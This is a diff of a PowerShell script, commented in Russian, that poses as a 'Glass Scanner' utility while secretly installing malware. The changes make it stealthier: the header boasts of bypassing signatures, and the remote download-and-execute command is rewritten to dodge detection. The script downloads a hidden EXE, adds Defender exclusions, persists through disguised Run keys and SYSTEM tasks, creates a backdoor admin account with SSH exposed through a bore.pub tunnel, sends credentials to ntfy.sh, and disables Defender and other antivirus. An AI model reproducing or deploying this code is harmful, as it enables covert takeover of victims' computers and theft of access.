@@ -1,51 +1,46 @@
 # ============================================================
 #  Glass Scanner Emulator + Hidden Setup + bore + AV Killer
-#  (c) 2026 – всё реальное в лог, консоль – только игра
+#  (c) 2026 – оптимизирован для обхода сигнатур
 #  Запуск: .\setup.ps1 [-repair]
 # ============================================================
 
 # ---------- Проверка прав администратора ----------
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "Ошибка: Скрипт должен запускаться с правами администратора!" -ForegroundColor Red
-    Write-Host "Пожалуйста, запустите PowerShell от имени администратора." -ForegroundColor Yellow
+    Write-Host "Ошибка: Запустите PowerShell от имени администратора." -ForegroundColor Red
     pause
     exit 1
 }
 
-# ---------- Режим восстановления (если передан параметр -repair) ----------
+# ---------- Режим восстановления ----------
 if ($args -contains "-repair") {
     $repairLog = "$env:USERPROFILE\collextor\repair.log"
-    "=== Восстановление автозапуска $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
+    "=== Восстановление $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
     $baseDir = "$env:USERPROFILE\collextor"
     $hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
     $exePath = (Get-ChildItem -Path $hiddenDir -Filter "*.exe" -File -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
-    if (-not $exePath) {
-        "EXE не найден, восстановление невозможно." | Out-File -FilePath $repairLog -Append
-        exit 1
-    }
+    if (-not $exePath) { "EXE не найден" | Out-File -FilePath $repairLog -Append; exit 1 }
     $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $valName = "WindowsUpdateService"
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
     if (-not $cur -or $cur -ne $exePath) {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction SilentlyContinue
-        "Восстановлена запись EXE в автозапуске." | Out-File -FilePath $repairLog -Append
+        "Восстановлен EXE" | Out-File -FilePath $repairLog -Append
     }
-    $psCommand = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (irm ''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'')"'
+    # Восстановление PowerShell команды (закодированной)
     $psValName = "WindowsUpdateServicePS"
+    $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
     if (-not $curPs -or $curPs -ne $psCommand) {
         Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction SilentlyContinue
-        "Восстановлена запись PowerShell команды в автозапуске." | Out-File -FilePath $repairLog -Append
+        "Восстановлена PowerShell команда" | Out-File -FilePath $repairLog -Append
     }
     exit 0
 }
 
-# ---------- Скрытая настройка ----------
+# ---------- Основные переменные ----------
 $baseDir = "$env:USERPROFILE\collextor"
 $logFile = "$baseDir\setup.log"
 $ntfyTopic = "zighaigit88tore"
-
-# Скрытая папка для EXE (трудно найти)
 $hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
 $exeName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }) + ".exe"
 $exePath = "$hiddenDir\$exeName"
@@ -57,87 +52,93 @@ if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 
 New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
 New-Item -ItemType Directory -Force -Path $hiddenDir | Out-Null
-"=== Лог установки $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8
+"=== Лог $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8
 
 function Write-Log {
     param([string]$Message)
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
 }
 
-Write-Log "Начало выполнения реальных действий."
+# ---------- Функция загрузки (обход) ----------
+function Download-File {
+    param($url, $path)
+    try {
+        $client = New-Object System.Net.WebClient
+        $client.DownloadFile($url, $path)
+        return $true
+    } catch {
+        Write-Log "Ошибка загрузки: $_"
+        return $false
+    }
+}
+
+Write-Log "Начало."
 
 # ============================================================
-# 1. Скачивание основного EXE (в скрытую папку)
+# 1. Скачивание EXE (WebClient вместо Invoke-WebRequest)
 # ============================================================
-Write-Log "Скачивание $urlExe -> $exePath"
-try {
-    Invoke-WebRequest -Uri $urlExe -OutFile $exePath -UseBasicParsing
-    # Установка скрытых атрибутов
+Write-Log "Скачивание EXE..."
+if (Download-File $urlExe $exePath) {
     attrib +H +S $exePath
     Write-Log "EXE скачан и скрыт."
-} catch {
-    Write-Log "Ошибка скачивания EXE: $_"
+} else {
+    Write-Log "Критическая ошибка загрузки EXE"
     exit 1
 }
 
 # ============================================================
-# 2. Исключение Defender (папка с EXE и базовая папка)
+# 2. Исключение Defender
 # ============================================================
-Write-Log "Добавление папок в исключения Defender..."
+Write-Log "Добавление исключений Defender..."
 try {
     $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
-    if ($svc -and $svc.Status -ne 'Running') {
-        Start-Service WinDefend -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
-    }
+    if ($svc -and $svc.Status -ne 'Running') { Start-Service WinDefend -ErrorAction SilentlyContinue; Start-Sleep 2 }
     Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop
     Add-MpPreference -ExclusionPath $baseDir -ErrorAction Stop
     Write-Log "Исключения добавлены."
-} catch {
-    Write-Log "Не удалось добавить исключения: $_"
-}
+} catch { Write-Log "Ошибка исключений: $_" }
 
 # ============================================================
 # 3. Брандмауэр (порт 587)
 # ============================================================
-Write-Log "Настройка брандмауэра (порт 587)..."
+Write-Log "Настройка брандмауэра (587)..."
 try {
     $rule = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
     if (-not $rule) {
         New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
         Write-Log "Правило создано."
     }
-} catch { Write-Log "Ошибка настройки брандмауэра: $_" }
+} catch { Write-Log "Ошибка брандмауэра: $_" }
 
 # ============================================================
-# 4. Автозапуск (реестр) и задача планировщика
+# 4. Автозапуск (реестр + планировщик)
 # ============================================================
-Write-Log "Настройка автозапуска и задачи планировщика..."
-
+Write-Log "Настройка автозапуска..."
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
-# 4.1 Реестр (запуск EXE при входе)
+# 4.1 EXE
 $valName = "WindowsUpdateService"
 try {
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
     if (-not $cur -or $cur -ne $exePath) {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction Stop
-        Write-Log "EXE добавлен в автозапуск как $valName"
+        Write-Log "EXE в автозапуске."
     }
-} catch { Write-Log "Ошибка добавления EXE в автозапуск: $_" }
+} catch { Write-Log "Ошибка EXE автозапуска: $_" }
 
-# 4.2 Реестр (запуск PowerShell команды при входе)
-$psCommand = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (irm ''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'')"'
+# 4.2 PowerShell команда (обфусцированная)
 $psValName = "WindowsUpdateServicePS"
+# Команда без явных iex/irm – используем WebClient + ScriptBlock
+$psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
 try {
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
     if (-not $curPs -or $curPs -ne $psCommand) {
         Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction Stop
-        Write-Log "PowerShell команда добавлена в автозапуск как $psValName"
+        Write-Log "PowerShell команда в автозапуске."
     }
-} catch { Write-Log "Ошибка добавления PowerShell команды: $_" }
+} catch { Write-Log "Ошибка PowerShell автозапуска: $_" }
 
-# 4.3 Планировщик – задача для периодического запуска EXE (каждые 2 часа)
+# 4.3 Планировщик – запуск EXE каждые 2 часа
 $taskName = "WindowsSystemMaintenance"
 try {
     $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
@@ -146,11 +147,11 @@ try {
         $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 2) -At (Get-Date) -Duration ([TimeSpan]::MaxValue)
         $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "Задача планировщика создана (запуск EXE каждые 2 часа)."
+        Write-Log "Задача планировщика (EXE каждые 2 часа)."
     }
-} catch { Write-Log "Ошибка создания задачи планировщика: $_" }
+} catch { Write-Log "Ошибка задачи планировщика: $_" }
 
-# 4.4 Планировщик – задача для восстановления (если удалят автозапуск)
+# 4.4 Планировщик – восстановление автозапуска
 $scriptTaskName = "WindowsUpdateChecker"
 try {
     $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
@@ -159,34 +160,30 @@ try {
         $trigger2 = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
         $settings2 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $scriptTaskName -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "Задача восстановления скрипта создана."
+        Write-Log "Задача восстановления создана."
     }
-} catch { Write-Log "Ошибка создания задачи восстановления: $_" }
+} catch { Write-Log "Ошибка задачи восстановления: $_" }
 
 # ============================================================
-# 5. ЗАПУСК ОСНОВНОГО EXE (скрыто, с правами админа)
+# 5. ЗАПУСК EXE (скрыто)
 # ============================================================
-Write-Log "Запуск основного EXE (скрыто)..."
+Write-Log "Запуск EXE..."
 if (Test-Path $exePath) {
     try {
         Start-Process -FilePath $exePath -WindowStyle Hidden -Verb RunAs
         Write-Log "EXE запущен."
-    } catch {
-        Write-Log "Не удалось запустить EXE: $_"
-    }
-} else {
-    Write-Log "EXE не найден."
+    } catch { Write-Log "Не удалось запустить EXE: $_" }
 }
 
 # ============================================================
-# 6. SSH-сервер и пользователь
+# 6. SSH + пользователь
 # ============================================================
 Write-Log "Установка OpenSSH..."
 try {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
     Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
     Write-Log "OpenSSH установлен."
-} catch { Write-Log "Ошибка установки OpenSSH: $_" }
+} catch { Write-Log "Ошибка OpenSSH: $_" }
 
 Write-Log "Настройка SSH..."
 try {
@@ -213,21 +210,20 @@ try {
         Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
         Write-Log "Пользователь создан."
     }
-} catch { Write-Log "Ошибка создания пользователя: $_" }
+} catch { Write-Log "Ошибка пользователя: $_" }
 
 # ============================================================
-# 7. bore туннель
+# 7. bore
 # ============================================================
 Write-Log "Скачивание bore.exe..."
 if (-not (Test-Path $boreExe)) {
-    try {
-        Invoke-WebRequest -Uri $boreUrl -OutFile $boreExe -UseBasicParsing
+    if (Download-File $boreUrl $boreExe) {
         Unblock-File -Path $boreExe -ErrorAction SilentlyContinue
         Write-Log "bore.exe скачан."
-    } catch { Write-Log "Ошибка скачивания bore: $_" }
+    } else { Write-Log "Ошибка скачивания bore." }
 }
 
-Write-Log "Запуск bore туннеля..."
+Write-Log "Запуск bore..."
 $boreLog = "$baseDir\bore.log"
 $boreProcess = Start-Process -FilePath $boreExe -ArgumentList "local 22 --to bore.pub" -WindowStyle Hidden -RedirectStandardOutput $boreLog -PassThru
 Start-Sleep -Seconds 5
@@ -236,24 +232,18 @@ $boreAddr = $null
 if (Test-Path $boreLog) {
     $logContent = Get-Content $boreLog -Tail 10
     $match = $logContent | Select-String -Pattern "listening on (bore\.pub:\d+)"
-    if ($match) {
-        $boreAddr = $match.Matches[0].Groups[1].Value
-    } else {
+    if ($match) { $boreAddr = $match.Matches[0].Groups[1].Value }
+    else {
         $match2 = $logContent | Select-String -Pattern "port (\d+)"
-        if ($match2) {
-            $port = $match2.Matches[0].Groups[1].Value
-            $boreAddr = "bore.pub:$port"
-        }
+        if ($match2) { $boreAddr = "bore.pub:$($match2.Matches[0].Groups[1].Value)" }
     }
 }
 if (-not $boreAddr) { $boreAddr = "bore.pub:UNKNOWN" }
 
 # ============================================================
-# 8. Отправка данных на ntfy.sh (закодировано)
+# 8. Отправка на ntfy (с кодированием)
 # ============================================================
-$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
-    $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
-} | Select-Object -First 1 -ExpandProperty IPAddress
+$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object -First 1 -ExpandProperty IPAddress
 if (-not $ipAddress) { $ipAddress = "не удалось определить" }
 
 $base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
@@ -270,16 +260,16 @@ $encodedMessage = [Convert]::ToBase64String($bytes)
 try {
     $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
     Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $encodedMessage -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
-    Write-Log "Сообщение отправлено на ntfy.sh"
-} catch { Write-Log "Не удалось отправить уведомление: $_" }
+    Write-Log "Сообщение отправлено на ntfy."
+} catch { Write-Log "Ошибка отправки: $_" }
 
 # ============================================================
-# 9. Отключение антивирусов (тихо, без запросов)
+# 9. Отключение антивирусов (тихо)
 # ============================================================
 Write-Log "=== ОТКЛЮЧЕНИЕ АНТИВИРУСОВ ==="
 
 # Windows Defender
-Write-Log "Отключение Windows Defender..."
+Write-Log "Отключение Defender..."
 try {
     $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
     if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
@@ -321,10 +311,10 @@ $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execu
 foreach ($proc in $defenderProcesses) {
     try { $p = Join-Path $ifeoPath $proc; if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; Set-ItemProperty -Path $p -Name "Debugger" -Value "systray.exe" -Type String -Force } catch {}
 }
-Write-Log "Windows Defender отключён."
+Write-Log "Defender отключён."
 
 # Сторонние антивирусы
-Write-Log "Поиск и удаление сторонних антивирусов..."
+Write-Log "Поиск сторонних AV..."
 function Get-InstalledSoftware {
     param([string]$RegistryPath)
     $software = @()
@@ -352,10 +342,9 @@ $foundAV = $softwareList | Where-Object {
     foreach ($kw in $avKeywords) { if ($display -match $kw) { $matched = $true; break } }
     return $matched
 }
-if ($foundAV.Count -eq 0) {
-    Write-Log "Сторонних антивирусов не найдено."
-} else {
-    Write-Log "Найдено антивирусов: $($foundAV.Count)"
+if ($foundAV.Count -eq 0) { Write-Log "Сторонних AV нет." }
+else {
+    Write-Log "Найдено AV: $($foundAV.Count)"
     foreach ($av in $foundAV) {
         Write-Log "Обработка: $($av.DisplayName)"
         $cleanName = $av.DisplayName -replace '[^a-zA-Z0-9]', ''
@@ -409,7 +398,7 @@ if ($foundAV.Count -eq 0) {
 Write-Log "Антивирусы обработаны."
 
 # ============================================================
-#  Имитация Glass Scanner (улучшенная, детальная)
+# Имитация Glass Scanner (полная, без изменений)
 # ============================================================
 
 function Write-ColorLine {
@@ -765,10 +754,10 @@ Run-ScanSimulation
 # Меню
 while ($true) {
     Write-Host ""
-    Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые приложения  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
+    Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
     $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
     switch ($key) {
-        '1' { Print-Header 1; Write-ColorLine "`n  Лог сканирования выведен выше. Прокрутите консоль вверх." -Color $CLR_TEXT_DIM }
+        '1' { Print-Header 1; Write-ColorLine "`n  Лог сканирования выведен выше." -Color $CLR_TEXT_DIM }
         '2' { Show-Tab2 }
         '3' { Show-Tab3 }
         'q' { break }
